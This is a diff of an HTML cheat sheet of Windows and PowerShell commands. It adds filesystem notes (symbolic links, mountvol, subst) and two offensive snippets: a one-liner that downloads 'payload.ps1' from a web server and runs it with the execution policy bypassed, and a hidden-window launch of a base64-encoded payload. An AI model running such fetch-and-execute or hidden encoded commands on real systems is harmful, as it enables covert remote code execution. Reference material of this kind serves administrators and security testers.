@@ -219,6 +219,8 @@ Here is a correspondence table between PowerShell commands and commands from oth
 <ul>
 <li><p>PowerShell (<code class="docutils literal notranslate"><span class="pre">iex</span></code> is an alias to <code class="docutils literal notranslate"><span class="pre">Invoke-Expression</span></code>):</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="n">exec</span> <span class="n">bypass</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http://webserver/payload.ps1&#39;)|iex&quot;</span>
+
+<span class="n">powershell</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">exec</span> <span class="n">bypass</span> <span class="s2">&quot;iex (New-Object Net.Webclient).DownloadString(&#39;http://webserver/payload.ps1&#39;)&quot;</span>
 </pre></div>
 </div>
 </li>
@@ -246,6 +248,19 @@ ipmo BitsTransfer;Start-BitsTransfer -Source &quot;http://webserver/file.txt&quo
 </div>
 <p>Run a PowerShell script:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>%windir%\System32\WindowsPowerShell\v1.0\powershell.exe -Noninteractive -ExecutionPolicy Bypass –Noprofile -file MyScript.ps1
+</pre></div>
+</div>
+<p>Run PowerShell code endoded as UTF-16LE+Base64:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># start /B : start application without creating a new window</span>
+<span class="c1"># -nop for -NoProfile : do not load the PowerShell profile</span>
+<span class="c1"># -sta for -Sta : start using a single-threaded apartment</span>
+<span class="c1"># -noni for -NonInteractive : does not present an interactive prompt</span>
+<span class="c1"># -w 1 or -w hidden or -win Hidden for -WindowStyle Hidden : hiden PowerShell window</span>
+<span class="c1"># -enc for -EncodedCommand : execute the command encoded in base64</span>
+<span class="c1"># -ep bypass or -exec bypass for -ExecutionPolicy bypass : set the default execution</span>
+<span class="c1">#       policy for the current session and saves it in $env:PSExecutionPolicyPreference</span>
+<span class="c1">#       (redundant when -enc is given)</span>
+start /b powershell -nop -sta -w <span class="m">1</span> -enc <span class="s2">&quot;</span><span class="k">$(</span>iconv -t utf16le &lt; payload.ps1 <span class="p">|</span> base64<span class="k">)</span><span class="s2">&quot;</span>
 </pre></div>
 </div>
 </div>
@@ -513,6 +528,35 @@ New-PSDrive –Name <span class="s2">&quot;Z&quot;</span> -PSProvider FileSystem
 </pre></div>
 </div>
 </div>
+<div class="section" id="filesystem-management">
+<h2>Filesystem management<a class="headerlink" href="#filesystem-management" title="Permalink to this headline">¶</a></h2>
+<p>Since Windows Vista, it is possible to create symbolic links on Windows:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Create a symbolic link to a file</span>
+mklink <span class="s2">&quot;C:\Path\to\link\file&quot;</span> <span class="s2">&quot;C:\Path\to\target\file&quot;</span>
+
+<span class="c1"># Create a symbolic link to a directory</span>
+mklink /D <span class="s2">&quot;C:\Path\to\link\directory&quot;</span> <span class="s2">&quot;C:\Path\to\target\directory&quot;</span>
+
+<span class="c1"># With PowerShell 5.0 (Windows 10)</span>
+New-Item -Path <span class="s2">&quot;C:\Path\to\link&quot;</span> -ItemType SymbolicLink -Value <span class="s2">&quot;C:\Path\to\target&quot;</span>
+</pre></div>
+</div>
+<p>The command to mount a volume on a path is <a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mountvol">mountvol</a>:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Example from Microsoft documentation</span>
+mountvol <span class="se">\s</span>ysmount <span class="se">\\</span>?<span class="se">\V</span>olume<span class="se">\{</span>2eca078d-5cbc-43d3-aff8-7e8511f60d0e<span class="o">}</span><span class="se">\</span>
+
+<span class="c1"># Enumerate the volumes from PowerShell</span>
+Get-WmiObject Win32_Volume
+</pre></div>
+</div>
+<p>It is also possible to associate a path with a drive letter using command <a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/subst">subst</a>:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>subst Z: <span class="s2">&quot;C:\my\path&quot;</span>
+
+<span class="c1"># Remove the association</span>
+subst Z: /d
+</pre></div>
+</div>
+</div>
 <div class="section" id="alternate-data-streams">
 <h2>Alternate Data Streams<a class="headerlink" href="#alternate-data-streams" title="Permalink to this headline">¶</a></h2>
 <p>Get files with <code class="docutils literal notranslate"><span class="pre">Zone.Identifier</span></code> alternate data stream (ADS):</p>
@@ -642,6 +686,7 @@ Set-Location MYDB:<span class="se">\T</span>ables<span class="se">\U</span>sers
 <li><a class="reference internal" href="#firewall">Firewall</a></li>
 <li><a class="reference internal" href="#tcp-port-forwarding-with-netsh">TCP port forwarding with netsh</a></li>
 <li><a class="reference internal" href="#network-shares">Network shares</a></li>
+<li><a class="reference internal" href="#filesystem-management">Filesystem management</a></li>
 <li><a class="reference internal" href="#alternate-data-streams">Alternate Data Streams</a></li>
 <li><a class="reference internal" href="#csv-and-table-viewer">CSV and table viewer</a></li>
 <li><a class="reference internal" href="#mssql-client">MSSQL client</a></li>
